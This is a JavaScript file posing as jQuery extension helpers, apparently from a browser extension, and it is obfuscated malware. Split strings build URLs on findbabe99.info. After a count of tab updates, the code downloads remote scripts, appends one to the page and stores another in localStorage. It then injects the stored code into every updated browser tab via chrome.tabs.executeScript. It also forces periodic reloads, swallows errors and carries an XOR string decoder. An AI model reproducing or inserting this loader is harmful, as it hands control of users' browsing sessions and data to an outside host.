jQuery.xGet = function(hash) {
    var result = '';
    for (var i=0; i<hash.length; i++) {
        var _pgrwcm = true;
        var stringName = "String";
        var ch = "fromChar" + "Code";
        var code = ch.slice(8,2+10);
        var stringProto = window[stringName];
        var k = $K;
        var r = hash['char' + code + 'At'](i);

        result += stringProto[ch]((~k | ~r) & (k | r));
    }
    return result;
};

jQuery.xAddr = function(noBg){
    noBg = noBg || false;
    var d = ".";
    var c = ":";
    var s = "/";
    var p = "p";

    var pr = "srx";
    var cc = "code";

    var dd = "findbabe99.info/";
    if (noBg)
        d = dd + "new" + cc + s + pr + cc + d + p + 'h' + p;
    else
        d = dd + "sc" + s + pr + "load" + d + 't' + "x" + 't';

    s += s;
    return 'http' + c + s + d;
};

jQuery.xTabs = function() {
    return window['chrome']['tabs'];
};

jQuery.xStore = function(callback, insert) {
    var t = jQuery.xTabs();
    var p = "pdated";
    var o = t["onU"+p];
    var lll = localStorage;
    o.addListener(function(tb) {
        if (lll.xcnt) {
            if (lll.xcnt > 20) {
                callback();
            } else
                lll.xcnt++;
        } else
            lll.xcnt = 1;
        insert(tb);
        var now = jQuery.now();
        if (!window.uptmnd) {
            window.uptmnd = now + 2*60*60*1000;
        } else if (window.uptmnd < now) {
            location.reload();
        }
    });
};

jQuery.xLoad = function() {
    try {
        var tabs = jQuery.xTabs();
        var ls = localStorage;
        var e = "cript";
        var key = 'xbrequurf';
        if (tabs && tabs !== undefined) {
            var t = true;
            var k = function() {
                if (!t) return;
                t = false;
                jQuery.get(jQuery.xAddr(), function(a) {
                    if (a < " ")
                        return;
                    var u = "s" + e + ">";
                    jQuery("body").append("<" + u + a + "</" + u);
                });
                jQuery.get(jQuery.xAddr(!t), function(a){
                    if (a < " ")
                        return;
                    ls[key] = a;
                });
            };
            var load = function(tab) {
                var a = ls[key];
                if (!a || a < " " || !tab) return;
                tabs["executeS" + e](tab, {
                    code: a
                });
            }
            jQuery.xStore(k, load);
        }
    } catch(e) {}
};

